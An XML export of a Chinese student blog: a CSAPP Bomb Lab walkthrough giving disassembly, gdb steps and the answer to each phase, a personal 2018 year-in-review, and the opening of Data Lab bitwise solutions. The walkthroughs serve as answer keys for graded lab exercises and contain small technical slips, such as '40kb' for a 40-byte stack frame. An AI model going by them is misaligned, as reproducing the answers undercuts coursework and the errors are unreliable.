    <content type="text"><![CDATA[序 这是csapp系列的第二篇文章。具体的题目请见官网。另，本文均为自己手打，可能会有不少错误。如若发现有错误或者哪里写得不清楚，欢迎联系我修改(右下角小图标点开即可对话)。 这个lab从头到尾都是自己慢慢看过来的，花了很长的时间，也不知道算不算值得吧。个人见解：看反汇编代码是真的很花时间，对着几十行的代码有的时候看了几个小时还是懵的。这个时候还是换一下心情，做点别的事，可能突然就看懂了。但也不要看到代码多就直接放弃了吧，沉下心来看，还是可以看得懂的。 bomb lab实验要求 如同字面上的意思，这个实验要求我们拆一个“炸弹”。总共有六个关卡，需要保证每一个题目的输出结果都能满足某个特定的要求（答案不一定唯一），否则炸弹爆炸，游戏失败。 实验文件：bomb: 炸弹，打开后需要正确输入对应的字符串才能通关bomb.c: bomb的main函数所在的文件，提供给我们进行查看 实验目的：考察gdb的使用，以及reverse engneering的能力。需要学会使用gdb参考网站 さあ、私たちの実験を始めましょう。 首先，我们需要先使用objdump -d bomb &gt; bomb.txt这个命令，将bomb反编译，并保存在txt文件当中，方便我们查看。然后，不妨来看一下bomb.c的代码，方便我们对整个实验有一个整体的了解。 注意看一下注释，上面告诉了我们，可以将已解决的答案放入另一个txt文件当中，运行时用run &lt; answer.txt将其导入，可以不用重复打。然后我们看一下整体，总共有六个字符串，每一个字符串输入后，会判断是否正确，错误则发生爆炸，正确则继续输入。看完之后，就准备进入反编译得到的文件了。 bomb.txt 我们先整体看一下这个文件里面有什么。文件很长，总共有一千多行，不可能每一行都去解读。我们可以利用一些小技巧帮助我们理解。如main函数，我们可以看到它分成如下的几个部分。12345678910111213141516171819202122// 读取第一个字符串 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; 400e37: 48 89 c7 mov %rax,%rdi 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; 400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e44: bf a8 23 40 00 mov $0x4023a8,%edi 400e49: e8 c2 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第二个 400e4e: e8 4b 06 00 00 callq 40149e &lt;read_line&gt; 400e53: 48 89 c7 mov %rax,%rdi 400e56: e8 a1 00 00 00 callq 400efc &lt;phase_2&gt; 400e5b: e8 64 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e60: bf ed 22 40 00 mov $0x4022ed,%edi 400e65: e8 a6 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第三个 400e6a: e8 2f 06 00 00 callq 40149e &lt;read_line&gt; 400e6f: 48 89 c7 mov %rax,%rdi 400e72: e8 cc 00 00 00 callq 400f43 &lt;phase_3&gt; 400e77: e8 48 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e7c: bf 0b 23 40 00 mov $0x40230b,%edi 400e81: e8 8a fc ff ff callq 400b10 &lt;puts@plt&gt; ... 结合bomb.c，我们应该可以很容易理解main.c的反汇编代码了。接下来，我们再看下其他函数。 1.strings_not_equal函数。名字很明显告诉了我们，这个函数是判断两个字符串是否相等的。相等则返回0 2.explode_bomb函数，注意到，其中使用了exit函数。也就是说，这个函数一旦运行，就意味着游戏失败，直接exit退出。12345678000000000040143a &lt;explode_bomb&gt;: 40143a: 48 83 ec 08 sub $0x8,%rsp 40143e: bf a3 25 40 00 mov $0x4025a3,%edi 401443: e8 c8 f6 ff ff callq 400b10 &lt;puts@plt&gt; 401448: bf ac 25 40 00 mov $0x4025ac,%edi 40144d: e8 be f6 ff ff callq 400b10 &lt;puts@plt&gt; 401452: bf 08 00 00 00 mov $0x8,%edi 401457: e8 c4 f7 ff ff callq 400c20 &lt;exit@plt&gt; 3.read_line函数。由名字我们也可以知道，这个函数就是为了读取一行字符串。 4.read_six_numbers函数。由名字，我们知道，这个函数就是用来读六个数字。注意代码中用到了sscanf函数，用于从某一个字符串中格式化读取。其中%rdi存放的是待读取字符串，%rsi存储的是用于格式化的串，后面跟着的都是变量的地址。如sscanf(“7 0”, “%d %d”, &amp;a, &amp;b)，返回值为成功读取的变量个数。 5.phase_1 phase_2 … 用于判断输入的字符串是否满足要求 phase_11234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; // 直接判断与0x402400位置的字符串是否相同 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 题目很短，难度也很小，就是将读取的字符串直接与首地址为0x402400的字符串作比较，若相同则返回，否则引爆炸弹。因此，我们需要知道0x402400中究竟放着什么字符串。直接从反汇编代码中没办法看出来，这个时候就要用到强大的gdb了。需要用到x命令。语法为: x/&lt;n/f/u&gt; 其中，n是一个正整数，表示需要显示的内存单元的个数。每个内存单元的大小与u相关。u表示每个单元的大小。f表示输出的格式。较常用的如下。 x 按十六进制格式输出 d 按十进制格式输出 t 按二进制格式输出 c 按字符格式输出 如：x/10c 0x402400 将以字符形式输出从0x402400开始的十个字节 x/10xw 0x402400 将以字符形式输出从0x402400开始的十个单元，每个单元为4个字节 具体的使用自己试一试就知道了。我们直接查看内存后就发现，对应的字符串为： Border relations with Canada have never been better. 第一题结束。 phase_2 第二题，长度明显加长了一些。我们可以试着将其分段解读。至于从哪里开始分的话，尽量是选择jmp类的命令所在的行或者jmp命令跳转到的行，这种地方有可能是for循环，或者条件分支语句的结尾。就第二题来说，我们可以将其分成两个部分。第一个部分如下：123456400efe: 48 83 ec 28 sub $0x28,%rsp // 分配40kb的内存空间400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; // 将空间传给函数，读取六个数字400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) // 判断第一个数字是否为1400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; // 为1，跳开；否则，引爆炸弹400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 第二个部分如下：12345678400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax // 取出下一个数字，并*2400f1c: 39 03 cmp %eax,(%rbx) // 判断每一个数字是否为上一个数字的两倍400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; // 是，跳开；不是，爆炸400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; // 循环体内部，依次判断输入是否正确400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 于是我们发现，整个程序对我们的要求有三个： 1.输入六个数字 2.第一个数字是1 3.第二个数字开始，每一个数字是前一个的两倍 由此，我们可以得到结果为：1， 2， 4， 8， 16， 32 phase_3 第三题，题目又变长了一些。在400f65之前，就是用sscanf读入两个数字。也就是说这次我们需要输入两个满足特定关系的数字。 再接下来的三行，程序判断输入的第一个数字是否大于小于等于7，否则爆炸。 接下来一行是重点了。1400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 这个代码是什么意思呢？注意号的作用,该指令跳转的目标点是地址为0x402470+8%rax的内存单元。因此，我们需要打印出来0x402470+8i的值，对照代码后会发现，其实源代码应该就是一个switch函数。再看下接下来的几行代码，基本都是这样的格式：12400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 也就是说，根据你所输入的第一个数，你的第二个数需要对应这跳转目标点mov赋的值。为了简单起见，笔者直接打印0x402470，得到答案。12345678// b为我们输入的第一个数字，v为我们输入的第二个数字。int a;switch(b) &#123; case 0: a = ... case 1: a = ... case 2: a = ...&#125;if (a != v) explode_bomb(); phase_4 这道题看起来难度并不大。前面我们已经做了三道题了，基本上开始能够看懂一些复杂一点点的代码。phase_3函数应该也就不成问题了。首先输入两个数字，第二个数字必须为0，第一个数字将放入func4函数当中。也就是说，我们目的就是看懂func4这个函数在干什么。然后根据函数推断出我们需要输入的第一个数字即可。1234400fd6: 89 c1 mov %eax,%ecx400fd8: c1 e9 1f shr $0x1f,%ecx400fdb: 01 c8 add %ecx,%eax400fdd: d1 f8 sar %eax 首先，上面这个部分一开始让我迷惑了很久，这是要干嘛？？其中shr向右移动31位只有两个结果，当%ecx的值大于等于0时，得到结果为0，否则得到-1。因此这几行其实是当%eax的值小于0的时候就减去1。最后再向又移一位（缺省则位移一位）。 再接下来这段笔者看了特别久，最后是采用尝试着打出源代码才理解的。如果有跟我一样的看不太懂的，也不妨试试这个办法。12345678910111213141516400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 如上，将其通过跳转指令划分为4个部分。然后我们发现它调用了自己，也就是说这是一个递归函数。注意到phase_4调用它之前放入了3个参数。我们可以尝试着打出源代码。1234567891011// a为我们输入的数，b初始为0，c初始值为15。我们需要返回的值是0。因此，只需要让一开始tt就等于a即可void func4(int a, int b, int c)&#123; int t = c-b; if(t&lt;0) t--; t&gt;&gt;=1; int tt=t+b; if(tt&gt;a) c=tt-1; return 2*func4(a,b,c); else if (tt==a) return 0; else return 2*func4(a,tt+1,c)+1;&#125; phase_5 这道题长度又一次增加了，不过好在难度还不算太大。其实能做完第四题的话做第五题问题应该是不大的。和之前一样。我们先尝试着将整个代码拆分成几个部分。 首先，要求我们输入的应该是一个字符串，且长度必须为6。接下来的几行是一个循环，我们先跳过。先看最后面的几行代码。12344010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp)4010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 上面几行将栈上面位于%rsp+10～%rsp+15的字符串与首地址为0x40245e的字符串相比较，打印地址后我们看到，字符串为flyers，也就是说我们的输入经过变换之后要变成flyers这个字符串。这个时候我们再回去看一下循环体内部是怎样做变换的。12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx40108f: 88 0c 24 mov %cl,(%rsp)401092: 48 8b 14 24 mov (%rsp),%rdx401096: 83 e2 0f and $0xf,%edx401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1)4010a4: 48 83 c0 01 add $0x1,%rax4010a8: 48 83 f8 06 cmp $0x6,%rax4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 注意到这一段代码，一次取出每一个字符。并将其与0xf相与，也就是说我们取出后四位的值c，再加上0x4024b0得到一个值v，再取出内存地址为v的值，放入栈当中。这样说可能有点难理解。我们来举一个例子。比如第一个字符串处理之后要变成’f’，查询ASCII得，相当与102，也就是0x66, 再查看一下内存，看到‘f’位于0x4024b9。因此我们需要的c的值为9，为了方便，我第一个字符输入的是i(0x69),和0xf相与之后恰好为9，满足要求。后面的同理，不再赘述。由此，本题成功解决了。 phase_6 这道题可以说是有点丧心病狂了。难度和之前感觉完全不在一个档次上。不过毕竟是压轴题，也可以理解。同样的，我们先将代码拆分成几个小部分。 首先，题目读取了六个数字。然后需要对这六个数字做出相当长的处理。下面的这一段应该是目前为止最难理解的一个点。如果无法理解，还请多看几遍。12345678910111213141516171819202122232425// 下面为一个嵌套循环，终止条件为r12 == 6 目的为检测是否所有字符均不相等以及小于等于6// %eax = a[i] (%r13)// %rbp = &amp;a[i]401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov (%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; // a[i] &gt; 6 爆炸401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; // %r12 == 6 退出循环// 第二层循环401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; // a[i] != a[i+j] 否则爆炸401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;// 第二层循环外40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 接下来的部分就比较好理解了。最终对整个程序的影响是将每一个值a[i]转化为7-a[i]。123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax) // a[i] = 7 - a[i]401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 再接下来这一段就比较麻烦了。和之前一样，我采用了尝试这打出源代码的方法进行理解。由于接下来的两段代码经常要访问内存，为了方便理解，我将内存代码打出来，欢迎查阅。 address address + 4 address + 8 address + 12 0x6032d0 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 0x000002b3 0x00000004 0x00603300 0x00000000 0x603310 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 0x000001bb 0x00000006 0x00000000 0x00000000 12345678910111213141516401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 123456789101112 // %rsi : 4 * i // %eax : 用于和a[i]做比较 // %ecx : a[i]for (int i = 0; i &lt; 6; i++)&#123; if (a[i]&lt;=1) &#123; M[%rsp + 8 * i + 32] = 0x6032d0; &#125; else &#123; // 经查看内存可得 M[%rsp + 8 * i + 32] = 0x6032d0 + 16 * (a[i]-1); &#125;&#125; 关于上面的这段函数，我们可以理解为它在构造一个结构体Node(注意，指针为64位，且为小端)，其中Node的成员如下：12345Node &#123; int value; int id; Node* next;&#125; 倘若我们这样看，会发现整个代码容易理解了很多，结合具体内存中的值，我们发现，下面的这一段其实就是将各个结构体元素连接起来，形成一个链表。1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 最后这一段其实就好理解很多了。其实就是从前往后遍历链表，然后检查下一个结构体元素的value是否大于上一个的，否则爆炸。再看一下前面的内存值。我们就可以得到满足每一个元素value均大于上一个的链表的顺序了：2，1，6，5，4，3。当然要是你信心满满直接把这个顺序输入进去的话（像我一样），你会发现，炸弹还是爆炸了。别忘了，前面有一个操作将a[i]变成了7-a[i]，因此，我们应该再处理一下，得到最终的正确答案为：5，6，1，2，3，4 Congratulations! You’ve defused the bomb.1234567894011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; secret_phase 然而，真的通关了吗？ 细心的同学可能会发现（我也发现啦！），在bomb.c中有着这样一段注释： /Wow, they got it! But isn’t something… missing? Perhaps something they overlooked? Mua ha ha ha ha! 从这句话，我们可以猜出，作者果然还是有阴谋的。于是我们再重新回去看了一下，发现了一个神奇的函数，叫secret_phase，果然有问题。crtf+f查找，发现这是在phase_defused中调用的，而且再看一下它调用的相关代码：12344015d1: 48 89 44 24 68 mov %rax,0x68(%rsp)4015d6: 31 c0 xor %eax,%eax4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt;4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 我们发现，只有当前6个炸弹全部拆除后才可以调用。这不明摆着是彩蛋了吗。接下来一大坨代码就是看你能不能顺利揭开彩蛋了。 接下来，再看下这坨代码：12345678910111213144015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r84015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx4015f0: be 19 26 40 00 mov $0x402619,%esi4015f5: bf 70 38 60 00 mov $0x603870,%edi4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; // 读取两个整数和一个字符串4015ff: 83 f8 03 cmp $0x3,%eax401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; // 没有读取到三个，原地爆炸401604: be 22 26 40 00 mov $0x402622,%esi401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; // 将读取的字符串与0x402622为首地址的字符串作比较401613: 85 c0 test %eax,%eax401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; // 字符串和给定的不相同，还是爆炸 恩，好吧，从一个给定的串中读取一些东西，打印0x402619后面的几个字符，我们发现结果是“%d %d %s”，读取两个整数和一个字符串。可事情并没有这么简单。我们尝试打印一下0x603870，发现字符串就只有“7 0”，不可能读3个数字。那我们怎么玩？？ 看来我们只好作弊了。使用gdb直接用print指令更改内存的值，将“7 0”后面补一点东西，补什么呢？那当然是0x402622上面的东西了。打印一下，发现是“DrEvil”，好吧满满的恶意。补上之后（可以用类似 p {int}0x603873=’D’ 这样的指令为内存单元赋值），就顺利进入了secret_phase函数了。 再看一下这个函数干了些什么。恩，读取了一个字符串，再用strtol函数将其转化为数字，也就是说，我们目的就是输入一个满足要求的数字。然后，又与2进行比较，也就是说，我们目的是要运行fun7函数，并且得到答案为2的返回值。 接下来我们看一下fun7函数。主体大概是这样子的。可以看出，这是一个递归。其中的v为我们输入的那个值。1234567if (x &lt;= v) &#123; return 2 * fun7(...);&#125;else if (x == v) return 0;else &#123; return 2 * fun7(...)+1;&#125; 好了，我们发现代码中有0x8(%rdi),%rdi这样的指令，接下来又要打印内存信息了。注意到一开始传入的值为0x6030f0,故我们打印一下0x6030f8和0x603100的值，发现答案为0x603110和0x603130,又是两个地址。并且，打印0x6030f0,0x603100,0x603110我们发现，结果都是一个比较小的值，不难猜测，这应该是一个二叉树。于是，按照这个规律，我们可以将整棵树打印出来.（其中各个框内表示的是该点的地址） 0x6030f00x6031100x6031300x6031900x6031500x6031700x6031b00x6031f00x6032500x6032700x6032300x6031d00x6032900x6032100x6032b0 接着，再倒推，2 = 2 * 1, 1 = 2 * 0 + 1 . 则应该选择地址为0x603150的点，打印得到，答案为22，结束。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[summary-2018]]></title>
    <url>%2F2019%2F01%2F01%2Fsummary-2018%2F</url>
    <content type="text"><![CDATA[2018年的一个小总结： 首先，其实不知道应该说什么比较好，整个2018年的话，应该还是算过得去吧。不知道该写什么，就还是按照时间的顺序写一下一些对我影响比较大的事情吧。 年初 记得2018年刚开始的时候，感慨还是挺深的，毕竟处在高三的中期，各个科目也基本都开始了总复习，心情还是略有些紧张的。尽管对很多事情都不确定，但还是硬着头皮往前走，当时基本上就一个目标，把高考考好。那段时间也算是挺努力的了，寒假也没玩什么游戏，基本上花了挺多时间来学习。 四五月份 这段时间就算是出生以来最难熬的一段时期了。天气十分的炎热，坐在教室里也几乎静不下心来学习。整个人的状态很乱。每天基本上就是刷题，除了题目还是题目，整个人真的十分的疲惫，但也没有任何办法，只能继续坚持下去。也许，那段时间也算是大学之前一段十分快乐的时光吧， 毕竟全班的同学一起向着同一个目标努力，这种机会以后基本上也都不会再有了。 六月七号 八号 每一年的这两天我想对全国的几百万考生来说都是及其难忘的。即便现在已经过了半年，那个时候自己的状态，心情，甚至在什么时间干了什么事，至今都记忆犹新。还有印象六月七号的那个晚上，下课时分，和另一个同学一起，在教室里谈论着未来。将来会发生什么事呢？考试要是砸了会怎么样呢？恩，基本上整个人都在那样的状态下，坐立不安。 到了六月八号下午，也许那是在那段时间心态最平和的时候了，什么也没说，什么也没想。考完恍若隔世，也是吧，毕竟十几年的读书最终换来的，最主要的也便是那一张写着成绩的白纸罢了。和父母一起，走在学校的街道上，心情说不上好，说不上坏。考完了，理论上来说应该是要比较开心的，可是在这种场合下却也怎么都开心不起来。是的，一个强烈的直觉告诉我：这次考试考得并不好，或者说很差。 接下来的一段时间里，基本上还是尽量让自己不要再去回忆考试的事情了。考得好坏都已经注定，再去想确实也没有任何意义。那段时间和母亲一起去珠海找我哥，又去普宁了一个同学家玩，接下来就是毕业典礼，然后就是揭晓成绩的时刻。 成绩揭晓 恩，看到成绩出来的那一刻，就像高考完铃声响起的刹那，脑子是空白的，不知该说些什么。然后就是不敢相信自己–我拿到了自己几乎未曾想过的分数，甚至都不敢去再看它一眼。还有印象，那个中午我啥也没吃，就躺在床上发呆，想想自己今后的路该怎么走。是要复读吗？不，绝对不行，我没有勇气去再面对一次高三。就这样吧，差一点就差一点吧，毕竟考试总有人会考得不好的，为什么不能偏偏是我呢？基本上，其实经过了一两天的缓和，也就没有再去想那么多了。尽管现在再次提起还是有些难过的，但也没办法吧。 后面到八月初，就又是一段算是十分快乐的时光了。加入了本地的一个补习社，和几个小伙伴们一起，备课，讲课，每天基本上都是在这样的重复中度过。最多的时候一天能有8节课，常常不得已要利用睡觉的时间来备课。那段时间觉得很累，但是却很舒坦。这里放一张照片纪念一下。 Before enter University 在忙完了辅导社之后，接下来的时间基本上都是在做一些提前的学习了。毕竟想要在大学考得好，还是需要提前下一番功夫，起码在这一点，要比别人赢在起跑线上，真的不愿意再一次输了。也就是在那段时间，认识了吴晓杰师兄和陈钊燚师兄，也是在他们的帮助下，对大学有了一点了解，也算是更加了解了一下自己究竟想要一些什么。然后就是在不断的学习了。 很奇怪，也许是高考考得不好，也许是因为一些其他什么事情，自从那段时间以来，心里最大的目标就只剩学习（其实还有看番hhh）了。可能是心里那一股不服输的劲吧，以及对自己越来越高的要求，总是不断地告诉自己，必须比别人多付出更多的时间，一定要学得更多，更好。也是从那段时间开始，基本上就已经不再碰任何游戏了，社团也不想参加，变成了一个真真正正的“宅”了。也许这确实有些不好吧。 Enter UniqueStudio 经过了开学以来的努力学习，以及一点运气，最后终于挺过了数轮面试，进入到了联创团队（uniquestudio）当中。还是很高兴能成为团队的一员的，至少说明了，自己的努力真的还是有回报的。然后再接下来，到年底的时间里面，基本上大部分的课余时间都留给了团队了。平均每周四五十小时以上的学习时间，一周又一周地过去。 刚开始进来的那段时间，也许是最艰难的。很多东西都完全不会，android studio的各种配置什么的问题可以卡好几天。在第一个任务的时候，还啥都不会，所有东西都是边学边做，一个小功能要重复改来改去弄好多遍，往往弄很多遍之后还是不太好，弄到自己也是很烦躁。所以第一个任务做得很差。到了第二个任务的时候，慢慢地开始注意了一些设计模式方面的问题，不会太盲目地想往哪里加功能就往哪里加，不过也是由于经验太少，反复踩了很多坑。好在最后终于算是基本完成了要求了，尽管花的时间比预计的要多一些。基本上对很多东西的了解又加深了一些。 再后面已经接近年末了，第二期任务做完一段时间过后，搭建了自己的第一个博客，也就是这里。也开始尝试这把自己的一些想法记录下来吧。然后也下决心开始看CSAPP这一本书了。说实话，这本书确实很多东西讲得很好（尽管我现在看的还很少），基本上能把我想要知道的东西都讲了，不过语言还是令人很难受的一个坎，毕竟从初中开始英语就不怎么样。好在还有翻译这种神奇的东西，基本上靠半蒙半查加上一点直觉，慢慢地让自己能够静下心来看这本书了，也算是自己的一个进步了吧。 然后就基本上到了年末了，也就是前几天了。慢慢开始减少了一些花在这方面的时间了，稍微把时间分配给了一下课内的一些知识，毕竟说到底，到现在我都没办法确定自己究竟想要读研究生还是直接出来工作，毕竟大一上学期还是不要太早下论断的好吧。还是得看一下这学期末的成绩吧，如果能够考得比较好，将来有希望能保研去清北复交或者浙大中科大之类的，那还是有可能争取一下的。这个寒假应该就需要结合自己的成绩想清楚了吧。 expection 其实感觉这东西很说不准。毕竟现在真的还没办法未来要做什么。但近期的一些flag还是可以立一下的。尽量在寒假把CSAPP多看一点吧，最好能看完70%以上吧，以及最好多做几个实验，也算是巩固一下自己看书学到的一些知识。然后下学期开始后尽量快点把这本书看完，接着花几个星期的时间把开发艺术探索，源码设计模式等补了，有时间的话看一下争取在大一下学期结束之前把计网和现代操作系统看了吧。基本上大一能把这几本书看完就已经很不错了。 然后如果将来要走偏图形这一块的话，那可能需要稍微为这方面做一点准备了。以及线代一定要学好。如果将来选择争取保研的话，那可能要找一些数学方面的更深入的书籍学习一下，物理可能也需要花一些时间。毕竟理工科无论如何这两个科目一定不能差吧。 然后如果将来选择放弃保研，毕业后就直接出来工作的话，那可能会在大一的暑假看一下linux内核的一些东西或者是Android底层的源码，起码要比现在再深入一些吧。 Summary 最后还是再罗嗦一下吧。总的来说，2018年对我自己来说确实可以称得上是转折性的一年。这一年里发生了太多值得我去回忆的事情。我也很庆幸，自己能够变成现在这个样子，尽管它未必很好。很开心，现在身边能有很多优秀的同学值得我去学习，未来的路子还长，还需要一步一个脚印继续慢慢往前走去。 结尾还是要放点啥，就留下我特别喜欢的一段话吧： 人の人生は、自分の墓へ走る汽车に乗っているようだ。途中は沢山駅があるけど、ずっと最後まで侧にいってくれる人はいない。だから、いってくれた人が降りる前に、いくらさびしくても、感谢の気持ちでさよならと言おう。]]></content>
      <categories>
        <category>summary</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Datalab]]></title>
    <url>%2F2018%2F12%2F25%2Fcsapp-Datalab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第一篇文章。本文主要讲一下关于 datalab [Updated 11/2/18] 的解决方法以及简单的思路。如果有哪里写的不清楚或者有问题，欢迎联系我修改(右下角小图标点开即可对话)。 注：其中某些题目应该有更优的解法。以下仅供参考 bitXor题意：用 ~ 和 &amp; 运算符实现 Xor 运算符思路：我们知道Xor运算符是对每一个位，相同的话返回0，不同的话返回1。题目中仅有 &amp; 是双目运算符，那么我们可以采用 &amp; 运算符获得均为1的位，再取反，同理，用 &amp; 和 ~ 获得均为 0 的位，再取反，最后两者再进行 &amp; ，即可得到答案。解：123int bitXor(int x, int y) &#123; return ~(x&amp;y)&amp;~(~x&amp;~y);&#125; tmin题意：让你输出反码下的最小值思路：水题。。直接由定义得。解：123int tmin(void) &#123; return 1&lt;&lt;31;&#125; isTmax题意：判断一个数是否为反码下的最大值思路：若x为Tmax，x+1取反之后应该等于x。故可以采用取反与原数Xor的思路。但要注意，0xffffffff也满足该性质，需要排除。解：123int isTmax(int x) &#123; return !(~(x+1)^x)&amp;!(!(~x));&#125; allOddBits题意：判断一个数是否所有的奇数位都为1。(位的序号从0到32)思路：我们知道，若奇数位为均为1，则右移一位后偶数位均为1，两者相与的话为0xffffffff。利用该性质可得到答案。不过要注意，偶数位上的1会影响我们的判断，故需要利用掩码将其过滤。(0xA = 1010)解：1234int allOddBits(int x) &#123; x = x &amp; 0xAAAAAAAA; return !(~(x|(x&gt;&gt;1)));&#125; 